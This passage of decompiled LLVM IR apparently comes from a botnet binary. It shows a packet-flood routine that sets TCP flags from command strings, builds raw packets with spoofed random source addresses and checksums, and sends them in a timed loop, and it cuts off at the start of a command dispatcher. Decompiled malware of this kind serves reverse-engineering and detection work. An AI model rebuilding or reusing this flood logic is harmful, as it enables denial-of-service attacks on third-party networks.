  %v20_804bf86 = zext i8 %v4_804bf86 to i32
  %v23_804bf86 = or i32 %v20_804bf86, %v3_804bf84
  store i32 %v23_804bf86, i32* @ecx, align 4
  %v2_804bf8a = sext i8 %v4_804bf86 to i32
  store i32 %v2_804bf8a, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bf8f = icmp eq i1 %v15_804bf86, false
  br i1 %v1_804bf8f, label %dec_label_pc_804bfa3, label %dec_label_pc_804bf91

dec_label_pc_804bf91:                             ; preds = %dec_label_pc_804bf58
  store i32 %v1_804bdc9, i32* @eax, align 4
  %v3_804bf94 = load i8, i8* %v2_804c03f, align 1
  %v2_804bf98 = or i8 %v3_804bf94, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bf98 = zext i8 %v2_804bf98 to i32
  store i32 %v7_804bf98, i32* @edx, align 4
  store i8 %v2_804bf98, i8* %v2_804c03f, align 1
  br label %dec_label_pc_804c068

dec_label_pc_804bfa3:                             ; preds = %dec_label_pc_804bf58
  store i32 %v4_804bece, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804bece, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056a7f.109 to i32), i32* @edi, align 4
  %v7_804bfd3 = call i32 @_strncmp(i8* %v3_804c051, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056a7f.109, i32 0, i32 0), i32 4)
  %v8_804bfd3 = urem i32 %v7_804bfd3, 2
  %v9_804bfd3 = icmp eq i32 %v8_804bfd3, 0
  %v0_804bfd5 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bfd5 = or i1 %v0_804bfd5, %v9_804bfd3
  %v3_804bfd5 = zext i1 %v2_804bfd5 to i32
  %v4_804bfd5 = load i32, i32* %edx.global-to-local, align 4
  %v5_804bfd5 = and i32 %v4_804bfd5, -256
  %v6_804bfd5 = or i32 %v3_804bfd5, %v5_804bfd5
  %v7_804bfd5 = xor i32 %v6_804bfd5, 1
  store i32 %v7_804bfd5, i32* %edx.global-to-local, align 4
  %v3_804bfdb = and i32 %v7_804bfd3, -256
  %v1_804bfdd = trunc i32 %v7_804bfd5 to i8
  %v3_804bfdd = zext i1 %v0_804bfd5 to i8
  %v4_804bfdd = sub nsw i8 %v1_804bfdd, %v3_804bfdd
  %v15_804bfdd = icmp eq i8 %v4_804bfdd, 0
  %v20_804bfdd = zext i8 %v4_804bfdd to i32
  %v23_804bfdd = or i32 %v20_804bfdd, %v3_804bfdb
  store i32 %v23_804bfdd, i32* @ecx, align 4
  %v2_804bfe1 = sext i8 %v4_804bfdd to i32
  store i32 %v2_804bfe1, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bfe6 = icmp eq i1 %v15_804bfdd, false
  br i1 %v1_804bfe6, label %dec_label_pc_804bff7, label %dec_label_pc_804bfe8

dec_label_pc_804bfe8:                             ; preds = %dec_label_pc_804bfa3
  store i32 %v1_804bdc9, i32* @eax, align 4
  %v3_804bfeb = load i8, i8* %v2_804c03f, align 1
  %v2_804bfef = or i8 %v3_804bfeb, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bfef = zext i8 %v2_804bfef to i32
  store i32 %v7_804bfef, i32* @edx, align 4
  store i8 %v2_804bfef, i8* %v2_804c03f, align 1
  br label %dec_label_pc_804c068

dec_label_pc_804bff7:                             ; preds = %dec_label_pc_804bfa3
  store i32 %v4_804bece, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804bece, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056a83.110 to i32), i32* @edi, align 4
  %v7_804c027 = call i32 @_strncmp(i8* %v3_804c051, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056a83.110, i32 0, i32 0), i32 4)
  %v8_804c027 = urem i32 %v7_804c027, 2
  %v9_804c027 = icmp eq i32 %v8_804c027, 0
  %v0_804c029 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c029 = or i1 %v0_804c029, %v9_804c027
  %v3_804c029 = zext i1 %v2_804c029 to i32
  %v4_804c029 = load i32, i32* %edx.global-to-local, align 4
  %v5_804c029 = and i32 %v4_804c029, -256
  %v6_804c029 = or i32 %v3_804c029, %v5_804c029
  %v7_804c029 = xor i32 %v6_804c029, 1
  store i32 %v7_804c029, i32* %edx.global-to-local, align 4
  %v3_804c02f = and i32 %v7_804c027, -256
  %v1_804c031 = trunc i32 %v7_804c029 to i8
  %v3_804c031 = zext i1 %v0_804c029 to i8
  %v4_804c031 = sub nsw i8 %v1_804c031, %v3_804c031
  %v15_804c031 = icmp eq i8 %v4_804c031, 0
  %v20_804c031 = zext i8 %v4_804c031 to i32
  %v23_804c031 = or i32 %v20_804c031, %v3_804c02f
  store i32 %v23_804c031, i32* @ecx, align 4
  %v2_804c035 = sext i8 %v4_804c031 to i32
  store i32 %v2_804c035, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c03a = icmp eq i1 %v15_804c031, false
  br i1 %v1_804c03a, label %dec_label_pc_804c04b, label %dec_label_pc_804c03c

dec_label_pc_804c03c:                             ; preds = %dec_label_pc_804bff7
  store i32 %v1_804bdc9, i32* @eax, align 4
  %v3_804c03f = load i8, i8* %v2_804c03f, align 1
  %v2_804c043 = or i8 %v3_804c03f, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804c043 = zext i8 %v2_804c043 to i32
  store i32 %v7_804c043, i32* @edx, align 4
  store i8 %v2_804c043, i8* %v2_804c03f, align 1
  br label %dec_label_pc_804c068

dec_label_pc_804c04b:                             ; preds = %dec_label_pc_804bff7
  %v0_804c04b = load i32, i32* @global_var_805a080.18, align 128
  store i32 %v0_804c04b, i32* %edx.global-to-local, align 4
  store i32 %v4_804bece, i32* %eax.global-to-local, align 4
  %v1_804c054 = load i32, i32* @esp, align 4
  %v2_804c054 = add i32 %v1_804c054, 8
  %v3_804c054 = inttoptr i32 %v2_804c054 to i32*
  store i32 %v4_804bece, i32* %v3_804c054, align 4
  %v0_804c058 = load i32, i32* @esp, align 4
  %v1_804c058 = add i32 %v0_804c058, 4
  %v2_804c058 = inttoptr i32 %v1_804c058 to i32*
  store i32 ptrtoint ([18 x i8]* @global_var_8056a87.111 to i32), i32* %v2_804c058, align 4
  %v0_804c060 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c060 = load i32, i32* @esp, align 4
  %v2_804c060 = inttoptr i32 %v1_804c060 to i32*
  store i32 %v0_804c060, i32* %v2_804c060, align 4
  %v3_804c063 = call i32 @Rootsprintf(i32 4, i32 ptrtoint ([4 x i8]* @global_var_8056a83.110 to i32))
  store i32 %v3_804c063, i32* @eax, align 4
  br label %dec_label_pc_804c068

dec_label_pc_804c068:                             ; preds = %dec_label_pc_804c03c, %dec_label_pc_804bfe8, %dec_label_pc_804bf91, %dec_label_pc_804bf46, %dec_label_pc_804bf01, %dec_label_pc_804c04b
  %stack_var_-156.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056a83.110, i32 0, i32 0), %dec_label_pc_804c04b ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056a83.110, i32 0, i32 0), %dec_label_pc_804c03c ], [ %stack_var_-156.125, %dec_label_pc_804bfe8 ], [ %stack_var_-156.125, %dec_label_pc_804bf91 ], [ %stack_var_-156.125, %dec_label_pc_804bf46 ], [ %stack_var_-156.125, %dec_label_pc_804bf01 ]
  %stack_var_-160.0 = phi i32 [ 4, %dec_label_pc_804c04b ], [ 4, %dec_label_pc_804c03c ], [ %stack_var_-160.126, %dec_label_pc_804bfe8 ], [ %stack_var_-160.126, %dec_label_pc_804bf91 ], [ %stack_var_-160.126, %dec_label_pc_804bf46 ], [ %stack_var_-160.126, %dec_label_pc_804bf01 ]
  %v0_804c068 = load i32, i32* @esp, align 4
  %v1_804c068 = add i32 %v0_804c068, 4
  %v2_804c068 = inttoptr i32 %v1_804c068 to i32*
  store i32 ptrtoint (i32* @global_var_8056a71.105 to i32), i32* %v2_804c068, align 4
  %v0_804c070 = load i32, i32* @esp, align 4
  %v1_804c070 = inttoptr i32 %v0_804c070 to i32*
  store i32 0, i32* %v1_804c070, align 4
  %v2_804c077 = ptrtoint i8* %stack_var_-156.0 to i32
  %v3_804c077 = call i32 @__GI_strtok(i32 %stack_var_-160.0, i32 %v2_804c077)
  store i32 %v3_804c077, i32* %eax.global-to-local, align 4
  store i32 %v3_804c077, i32* %tmp91, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804c07f = icmp eq i32 %v3_804c077, 0
  %v1_804c083 = icmp eq i1 %v5_804c07f, false
  %tmp92 = inttoptr i32 %v3_804c077 to i8*
  br i1 %v1_804c083, label %dec_label_pc_804bece, label %dec_label_pc_804c089

dec_label_pc_804c089:                             ; preds = %dec_label_pc_804c068, %dec_label_pc_804beb3, %dec_label_pc_804be72
  %v0_804c089 = phi i8* [ %v0_804c089.pre, %dec_label_pc_804be72 ], [ %v5_804bec6, %dec_label_pc_804beb3 ], [ %tmp92, %dec_label_pc_804c068 ]
  %v1_804c089 = ptrtoint i8* %v0_804c089 to i32
  %v2_804c089 = call i32 @rand_cmwc(i32 %v1_804c089)
  %v1_804c08e = urem i32 %v2_804c089, 65536
  store i32 %v1_804c08e, i32* %edx.global-to-local, align 4
  %v1_804c094 = trunc i32 %v2_804c089 to i16
  %v3_804c094 = add i32 %v2_804bdb1, 34
  %v4_804c094 = inttoptr i32 %v3_804c094 to i16*
  store i16 %v1_804c094, i16* %v4_804c094, align 2
  %v1_804c09b = add i32 %v2_804bdb1, 36
  %v2_804c09b = inttoptr i32 %v1_804c09b to i16*
  store i16 0, i16* %v2_804c09b, align 4
  store i32 %v1_804bdc9, i32* %eax.global-to-local, align 4
  %v1_804c0a4 = add i32 %v2_804bdb1, 38
  %v2_804c0a4 = inttoptr i32 %v1_804c0a4 to i16*
  store i16 0, i16* %v2_804c0a4, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804bc81, label %dec_label_pc_804c0bd, label %dec_label_pc_804c0b0

dec_label_pc_804c0b0:                             ; preds = %dec_label_pc_804c089
  %v0_804c0b0 = load i8*, i8** %stack_var_-20, align 4
  %v1_804c0b0 = ptrtoint i8* %v0_804c0b0 to i32
  %v2_804c0b0 = call i32 @rand_cmwc(i32 %v1_804c0b0)
  br label %dec_label_pc_804c0d1

dec_label_pc_804c0bd:                             ; preds = %dec_label_pc_804c089
  %v1_804c0c0 = urem i32 %arg2, 65536
  store i32 %v1_804c0c0, i32* %eax.global-to-local, align 4
  %v1_804c0c3 = load i32, i32* @esp, align 4
  %v2_804c0c3 = inttoptr i32 %v1_804c0c3 to i32*
  store i32 %v1_804c0c0, i32* %v2_804c0c3, align 4
  %v3_804c0c6 = call i32 @htons(i16 %tmp39)
  br label %dec_label_pc_804c0d1

dec_label_pc_804c0d1:                             ; preds = %dec_label_pc_804c0b0, %dec_label_pc_804c0bd
  %storemerge12.in = phi i32 [ %v2_804c0b0, %dec_label_pc_804c0b0 ], [ %v3_804c0c6, %dec_label_pc_804c0bd ]
  %storemerge = trunc i32 %storemerge12.in to i16
  %sext = mul i32 %storemerge12.in, 65536
  %v4_804c0d4 = sdiv i32 %sext, 65536
  store i32 %v4_804c0d4, i32* @esi, align 4
  %v3_804c0d7 = add i32 %v2_804bdb1, 22
  %v4_804c0d7 = inttoptr i32 %v3_804c0d7 to i16*
  store i16 %storemerge, i16* %v4_804c0d7, align 2
  %v1_804c0de = load i32, i32* @esp, align 4
  %v2_804c0de = add i32 %v1_804c0de, 4
  %v3_804c0de = inttoptr i32 %v2_804c0de to i32*
  store i32 %v1_804bdc9, i32* %v3_804c0de, align 4
  store i32 %v2_804bdb1, i32* %eax.global-to-local, align 4
  %v1_804c0e5 = load i32, i32* @esp, align 4
  %v2_804c0e5 = inttoptr i32 %v1_804c0e5 to i32*
  store i32 %v2_804bdb1, i32* %v2_804c0e5, align 4
  %v0_804c0e8 = call i32 @tcpcsum()
  %v1_804c0ed = urem i32 %v0_804c0e8, 65536
  store i32 %v1_804c0ed, i32* %edx.global-to-local, align 4
  %v1_804c0f3 = trunc i32 %v0_804c0e8 to i16
  store i16 %v1_804c0f3, i16* %v2_804c09b, align 4
  store i32 %v2_804bdb1, i32* %eax.global-to-local, align 4
  %v1_804c0fa = or i32 %v2_804bdb1, 2
  %v2_804c0fa = inttoptr i32 %v1_804c0fa to i16*
  %v3_804c0fa = load i16, i16* %v2_804c0fa, align 2
  %v4_804c0fa = zext i16 %v3_804c0fa to i32
  store i32 %v4_804c0fa, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdb1, i32* %eax.global-to-local, align 4
  %v1_804c103 = load i32, i32* @esp, align 4
  %v2_804c103 = add i32 %v1_804c103, 4
  %v3_804c103 = inttoptr i32 %v2_804c103 to i32*
  store i32 %v4_804c0fa, i32* %v3_804c103, align 4
  %v0_804c107 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c107 = load i32, i32* @esp, align 4
  %v2_804c107 = inttoptr i32 %v1_804c107 to i32*
  store i32 %v0_804c107, i32* %v2_804c107, align 4
  %v3_804c10a = inttoptr i32 %v4_804c0d4 to i16*
  %v4_804c10a = call i32 @csum(i16* %v3_804c10a, i32 %v15_804bc66)
  %v1_804c10f = urem i32 %v4_804c10a, 65536
  store i32 %v1_804c10f, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdb1, i32* %eax.global-to-local, align 4
  %v1_804c115 = trunc i32 %v4_804c10a to i16
  %v3_804c115 = or i32 %v2_804bdb1, 10
  %v4_804c115 = inttoptr i32 %v3_804c115 to i16*
  store i16 %v1_804c115, i16* %v4_804c115, align 2
  %v0_804c119 = load i32, i32* @esp, align 4
  %v1_804c119 = inttoptr i32 %v0_804c119 to i32*
  store i32 0, i32* %v1_804c119, align 4
  %v2_804c120 = inttoptr i32 %v4_804c0d4 to i32*
  %v3_804c120 = call i32 @__GI_time(i32* %v2_804c120)
  %v5_804c125 = add i32 %v3_804c120, %arg3
  %v10_804c125 = icmp ult i32 %v5_804c125, %v3_804c120
  store i1 %v10_804c125, i1* %cf.global-to-local, align 1
  store i32 %v5_804c125, i32* %eax.global-to-local, align 4
  %v2_804c17c = or i32 %v2_804bdb1, 12
  %v3_804c17c = inttoptr i32 %v2_804c17c to i32*
  %v3_804c18a = or i32 %v2_804bdb1, 4
  %v4_804c18a = inttoptr i32 %v3_804c18a to i16*
  br label %dec_label_pc_804c134

dec_label_pc_804c134:                             ; preds = %dec_label_pc_804c1f8, %dec_label_pc_804c215, %dec_label_pc_804c0d1
  %stack_var_-68.0 = phi i32 [ 0, %dec_label_pc_804c0d1 ], [ %v4_804c215, %dec_label_pc_804c215 ], [ 0, %dec_label_pc_804c1f8 ]
  store i32 %v2_804bdb1, i32* %edx.global-to-local, align 4
  %v0_804c13a = load i32, i32* @esp, align 4
  %v1_804c13a = add i32 %v0_804c13a, 20
  %v2_804c13a = inttoptr i32 %v1_804c13a to i32*
  store i32 16, i32* %v2_804c13a, align 4
  %v1_804c142 = load i32, i32* @esp, align 4
  %v2_804c142 = add i32 %v1_804c142, 16
  %v3_804c142 = inttoptr i32 %v2_804c142 to i32*
  store i32 %v2_804bca6, i32* %v3_804c142, align 4
  %v0_804c146 = load i32, i32* @esp, align 4
  %v1_804c146 = add i32 %v0_804c146, 12
  %v2_804c146 = inttoptr i32 %v1_804c146 to i32*
  store i32 0, i32* %v2_804c146, align 4
  store i32 %v1_804bd8d, i32* @edi, align 4
  %v1_804c151 = load i32, i32* @esp, align 4
  %v2_804c151 = add i32 %v1_804c151, 8
  %v3_804c151 = inttoptr i32 %v2_804c151 to i32*
  store i32 %v1_804bd8d, i32* %v3_804c151, align 4
  %v0_804c155 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c155 = load i32, i32* @esp, align 4
  %v2_804c155 = add i32 %v1_804c155, 4
  %v3_804c155 = inttoptr i32 %v2_804c155 to i32*
  store i32 %v0_804c155, i32* %v3_804c155, align 4
  store i32 %v4_804bcee, i32* %eax.global-to-local, align 4
  %v1_804c15c = load i32, i32* @esp, align 4
  %v2_804c15c = inttoptr i32 %v1_804c15c to i32*
  store i32 %v4_804bcee, i32* %v2_804c15c, align 4
  %v1_804c15f = load i32, i32* %stack_var_-64, align 4
  %v2_804c15f = load i32, i32* %stack_var_-60, align 4
  %v3_804c15f = load i32, i32* %stack_var_-56, align 4
  %v4_804c15f = load i32, i32* %stack_var_-52, align 4
  %v6_804c15f = call i32 @__libc_sendto(i32 %stack_var_-68.0, i32 %v1_804c15f, i32 %v2_804c15f, i32 %v3_804c15f, i32 %v4_804c15f, i32 0)
  store i32 %storemerge10, i32* %eax.global-to-local, align 4
  %v1_804c167 = load i32, i32* @esp, align 4
  %v2_804c167 = inttoptr i32 %v1_804c167 to i32*
  store i32 %storemerge10, i32* %v2_804c167, align 4
  %v1_804c16a = load i32, i32* %stack_var_-64, align 4
  %v2_804c16a = call i32 @GetRandomIP(i32 %stack_var_-68.0, i32 %v1_804c16a)
  store i32 %v2_804c16a, i32* %eax.global-to-local, align 4
  %v1_804c16f = load i32, i32* @esp, align 4
  %v2_804c16f = inttoptr i32 %v1_804c16f to i32*
  store i32 %v2_804c16a, i32* %v2_804c16f, align 4
  %v0_804c172 = call i32 @htonl()
  store i32 %v0_804c172, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdb1, i32* %eax.global-to-local, align 4
  store i32 %v0_804c172, i32* %v3_804c17c, align 4
  %v1_804c17f = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %v1_804c184 = urem i32 %v1_804c17f, 65536
  store i32 %v1_804c184, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdb1, i32* %eax.global-to-local, align 4
  %v1_804c18a = trunc i32 %v1_804c17f to i16
  store i16 %v1_804c18a, i16* %v4_804c18a, align 4
  %v1_804c18e = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  store i32 %v1_804c18e, i32* %edx.global-to-local, align 4
  store i32 %v1_804bdc9, i32* %eax.global-to-local, align 4
  store i32 %v1_804c18e, i32* %v3_804be24, align 8
  %v1_804c19b = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %v1_804c1a0 = urem i32 %v1_804c19b, 65536
  store i32 %v1_804c1a0, i32* %edx.global-to-local, align 4
  %v1_804c1a6 = trunc i32 %v1_804c19b to i16
  store i16 %v1_804c1a6, i16* %v5_804bdcc, align 4
  store i16 0, i16* %v2_804c09b, align 4
  %v1_804c1b5 = load i32, i32* @esp, align 4
  %v2_804c1b5 = add i32 %v1_804c1b5, 4
  %v3_804c1b5 = inttoptr i32 %v2_804c1b5 to i32*
  store i32 %v1_804bdc9, i32* %v3_804c1b5, align 4
  store i32 %v2_804bdb1, i32* %eax.global-to-local, align 4
  %v1_804c1bc = load i32, i32* @esp, align 4
  %v2_804c1bc = inttoptr i32 %v1_804c1bc to i32*
  store i32 %v2_804bdb1, i32* %v2_804c1bc, align 4
  %v0_804c1bf = call i32 @tcpcsum()
  %v1_804c1c4 = urem i32 %v0_804c1bf, 65536
  store i32 %v1_804c1c4, i32* %edx.global-to-local, align 4
  %v1_804c1ca = trunc i32 %v0_804c1bf to i16
  store i16 %v1_804c1ca, i16* %v2_804c09b, align 4
  store i32 %v2_804bdb1, i32* %eax.global-to-local, align 4
  %v3_804c1d1 = load i16, i16* %v2_804c0fa, align 2
  %v4_804c1d1 = zext i16 %v3_804c1d1 to i32
  store i32 %v4_804c1d1, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdb1, i32* %eax.global-to-local, align 4
  %v1_804c1da = load i32, i32* @esp, align 4
  %v2_804c1da = add i32 %v1_804c1da, 4
  %v3_804c1da = inttoptr i32 %v2_804c1da to i32*
  store i32 %v4_804c1d1, i32* %v3_804c1da, align 4
  %v0_804c1de = load i32, i32* %eax.global-to-local, align 4
  %v1_804c1de = load i32, i32* @esp, align 4
  %v2_804c1de = inttoptr i32 %v1_804c1de to i32*
  store i32 %v0_804c1de, i32* %v2_804c1de, align 4
  %v1_804c1e1 = load i32, i32* %stack_var_-64, align 4
  %v2_804c1e1 = inttoptr i32 %stack_var_-68.0 to i16*
  %v3_804c1e1 = call i32 @csum(i16* %v2_804c1e1, i32 %v1_804c1e1)
  %v1_804c1e6 = urem i32 %v3_804c1e1, 65536
  store i32 %v1_804c1e6, i32* %edx.global-to-local, align 4
  %v1_804c1ec = trunc i32 %v3_804c1e1 to i16
  store i16 %v1_804c1ec, i16* %v4_804c115, align 2
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v10_804c1f3 = icmp ult i32 %stack_var_-68.0, %arg7
  store i1 %v10_804c1f3, i1* %cf.global-to-local, align 1
  %v15_804c1f3 = icmp eq i32 %stack_var_-68.0, %arg7
  %v1_804c1f6 = icmp eq i1 %v15_804c1f3, false
  br i1 %v1_804c1f6, label %dec_label_pc_804c215, label %dec_label_pc_804c1f8

dec_label_pc_804c1f8:                             ; preds = %dec_label_pc_804c134
  %v0_804c1f8 = load i32, i32* @esp, align 4
  %v1_804c1f8 = inttoptr i32 %v0_804c1f8 to i32*
  store i32 0, i32* %v1_804c1f8, align 4
  %v1_804c1ff = inttoptr i32 %stack_var_-68.0 to i32*
  %v2_804c1ff = call i32 @__GI_time(i32* %v1_804c1ff)
  store i32 %v2_804c1ff, i32* %eax.global-to-local, align 4
  %v10_804c204 = icmp ult i32 %v2_804c1ff, %v5_804c125
  store i1 %v10_804c204, i1* %cf.global-to-local, align 1
  %v8_804c207 = icmp sgt i32 %v2_804c1ff, %v5_804c125
  br i1 %v8_804c207, label %dec_label_pc_804c21d, label %dec_label_pc_804c134

dec_label_pc_804c215:                             ; preds = %dec_label_pc_804c134
  %v4_804c215 = add i32 %stack_var_-68.0, 1
  br label %dec_label_pc_804c134

dec_label_pc_804c21d:                             ; preds = %dec_label_pc_804c1f8, %dec_label_pc_804bca6, %dec_label_pc_804bd4b, %dec_label_pc_804bcfc
  %v0_804c227 = phi i32 [ %v4_804bcb6, %dec_label_pc_804bca6 ], [ %v3_804bd5b, %dec_label_pc_804bd4b ], [ %v3_804bd0c, %dec_label_pc_804bcfc ], [ %v2_804c1ff, %dec_label_pc_804c1f8 ]
  store i32 %v0_804bc65, i32* @ebx, align 4
  store i32 %v0_804bc64, i32* @esi, align 4
  ret i32 %v0_804c227

; uselistorder directives
  uselistorder i32 %v3_804c1e1, { 1, 0 }
  uselistorder i32 %v0_804c1bf, { 1, 0 }
  uselistorder i32 %v1_804c19b, { 1, 0 }
  uselistorder i32 %v1_804c17f, { 1, 0 }
  uselistorder i32 %stack_var_-68.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v5_804c125, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804c120, { 1, 0 }
  uselistorder i32 %v4_804c10a, { 1, 0 }
  uselistorder i32 %v0_804c0e8, { 1, 0 }
  uselistorder i32 %v4_804c0d4, { 2, 1, 0 }
  uselistorder i32 %v1_804c0c0, { 1, 0 }
  uselistorder i32 %v2_804c089, { 1, 0 }
  uselistorder i32 %stack_var_-160.0, { 1, 0 }
  uselistorder i8* %stack_var_-156.0, { 1, 0 }
  uselistorder i1 %v0_804c029, { 1, 0 }
  uselistorder i32 %v7_804c027, { 1, 0 }
  uselistorder i1 %v0_804bfd5, { 1, 0 }
  uselistorder i32 %v7_804bfd3, { 1, 0 }
  uselistorder i1 %v0_804bf7e, { 1, 0 }
  uselistorder i32 %v7_804bf7c, { 1, 0 }
  uselistorder i1 %v0_804bf33, { 1, 0 }
  uselistorder i32 %v7_804bf31, { 1, 0 }
  uselistorder i1 %v0_804beee, { 1, 0 }
  uselistorder i32 %v7_804beec, { 1, 0 }
  uselistorder i32 %v4_804bece, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i8* %stack_var_-156.125, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-160.126, { 3, 2, 1, 0 }
  uselistorder i8* %v3_804c051, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_804c03f, { 4, 9, 3, 8, 2, 7, 1, 6, 0, 5 }
  uselistorder i8* %v2_804be75, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i1 %v0_804be5f, { 1, 0 }
  uselistorder i32 %v7_804be5d, { 1, 0 }
  uselistorder i32 %v2_804be0c, { 1, 0 }
  uselistorder i32 %v1_804bdc9, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 %v2_804bdb1, { 15, 14, 12, 13, 11, 10, 9, 27, 26, 25, 8, 7, 24, 6, 4, 5, 23, 22, 21, 20, 28, 19, 18, 17, 16, 2, 3, 1, 0 }
  uselistorder i32 %v1_804bd8d, { 1, 0, 2 }
  uselistorder i32 %storemerge10, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804bd83, { 1, 0 }
  uselistorder i32 %v4_804bcee, { 1, 0, 4, 3, 2, 5, 6 }
  uselistorder i32 %v1_804bc94, { 1, 0 }
  uselistorder i32 %v15_804bc66, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 2, 0, 1, 4, 3 }
  uselistorder i32* %stack_var_-56, { 1, 2, 0 }
  uselistorder i32* %stack_var_-64, { 2, 1, 0, 4, 3 }
  uselistorder i8** %stack_var_-20, { 3, 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %eax.global-to-local, { 31, 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 48, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 44, 43, 45, 46, 47, 50, 49, 52, 51, 53, 54, 56, 55, 58, 57, 59, 60 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 18, 4, 5, 7, 6, 8, 10, 9, 11, 13, 12, 14, 16, 15, 17, 38, 39, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 ()* @tcpcsum, { 1, 0 }
  uselistorder i32 ()* @makeIPPacket, { 1, 0 }
  uselistorder i32 ()* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 0, 2, 1, 3 }
  uselistorder i32 %arg6, { 2, 3, 1, 0 }
  uselistorder i8* %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c21d, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804c134, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c0d1, { 1, 0 }
  uselistorder label %dec_label_pc_804c068, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804bece, { 1, 0 }
  uselistorder label %dec_label_pc_804bd8a, { 1, 0 }
  uselistorder label %bb90, { 1, 0 }
  uselistorder label %dec_label_pc_804bca6, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp119 = ptrtoint i32* %arg2 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804c22b = load i32, i32* @edi, align 4
  %v0_804c22c = load i32, i32* @esi, align 4
  %v0_804c22d = load i32, i32* @ebx, align 4
  store i32 %v0_804c22d, i32* %stack_var_-16, align 4
  %v5_804c22e = icmp ult i32* %stack_var_-16, inttoptr (i32 300 to i32*)
  store i1 %v5_804c22e, i1* %cf.global-to-local, align 1
  %v2_804c237 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804c254 = inttoptr i32 %v2_804c237 to i8*
  store i32 %v2_804c237, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8056720.19 to i32), i32* @edi, align 4
  %v7_804c266 = call i32 @_strncmp(i8* %v4_804c254, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056720.19, i32 0, i32 0), i32 5)
  %v8_804c266 = urem i32 %v7_804c266, 2
  %v9_804c266 = icmp eq i32 %v8_804c266, 0
  %v0_804c268 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c268 = or i1 %v0_804c268, %v9_804c266
  %v3_804c268 = zext i1 %v2_804c268 to i32
  %v4_804c268 = load i32, i32* @edx, align 4
  %v5_804c268 = and i32 %v4_804c268, -256
  %v6_804c268 = or i32 %v3_804c268, %v5_804c268
  %v7_804c268 = xor i32 %v6_804c268, 1
  store i32 %v7_804c268, i32* %edx.global-to-local, align 4
  %v1_804c270 = trunc i32 %v7_804c268 to i8
  %v3_804c270 = zext i1 %v0_804c268 to i8
